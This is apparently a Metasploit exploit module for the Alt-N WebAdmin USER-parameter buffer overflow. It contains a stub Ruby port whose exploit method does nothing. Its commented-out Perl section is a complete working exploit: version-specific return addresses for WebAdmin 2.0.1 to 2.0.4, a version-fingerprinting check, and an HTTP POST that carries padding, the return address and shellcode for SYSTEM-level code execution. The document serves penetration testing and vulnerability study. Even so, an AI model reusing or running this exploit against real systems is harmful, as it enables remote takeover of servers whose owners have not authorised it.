require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Alt-N WebAdmin USER Buffer Overflow',
			'Description'    => %q{
				Alt-N WebAdmin is prone to a buffer overflow condition. This
				is due to insufficient bounds checking on the USER
				parameter. Successful exploitation could result in code
				execution with SYSTEM level privileges.
					
			},
			'Author'         => [ 'y0@w00t-shell.net' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '8024'],
					[ 'NSS', '11771'],
					[ 'MIL', '95'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 830,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, winnt, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 24 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::altn_webadmin;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'Alt-N WebAdmin USER Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 1000],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	  
	

	'Payload' =>
	  {
		'Space'     => 830,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
		'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
Alt-N WebAdmin is prone to a buffer overflow condition. 
This is due to insufficient bounds checking on the USER 
parameter. Successful exploitation could result in code 
execution with SYSTEM level privileges.
}),

	'Refs'  =>
	  [
		['BID', '8024'],
		['NSS', '11771'],
		['MIL', '95'],
	  ],
	  
	'Targets' =>
	  [
		['WebAdmin 2.0.4 Universal', 0x10074d9b], # 2.0.4 webAdmin.dll
		['WebAdmin 2.0.3 Universal', 0x10074b13], # 2.0.3 webAdmin.dll
		['WebAdmin 2.0.2 Universal', 0x10071e3b], # 2.0.2 webAdmin.dll
		['WebAdmin 2.0.1 Universal', 0x100543c2], # 2.0.1 webAdmin.dll

	  ],
	'Keys' => ['webadmin'],

	'DisclosureDate' => 'Jun 24 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET / HTTP/1.0\r\n\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /v2\.0\.[1-4]/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode('Detected');
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $splat = Pex::Text::AlphaNumText(168);

	my $credz =
	  "User=". $splat. pack('V', $target->[1]). $shellcode.
	  "&Password=wtf&languageselect=en&Theme=Heavy&Logon=Sign+In\r\n";

	my $sploit =
	  "POST /WebAdmin.DLL?View=Logon HTTP/1.1\r\n".
	  "Content-Type: application/x-www-form-urlencoded\r\n".
	  "Connection: close\r\n".
	  "Cookie: User=y0; Lang=en; Theme=standard\r\n".
	  "User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.31-grsec i686)\r\n".
	  "Host: $target_host\r\n".
	  "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n".
	  "Accept-Language: en\r\n".
	  "Accept-Charset: iso-8859-1,*,utf-8\r\n".
	  "Content-Length: ". length($credz). "\r\n\r\n".
	  $credz;

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}


=end


end
end	
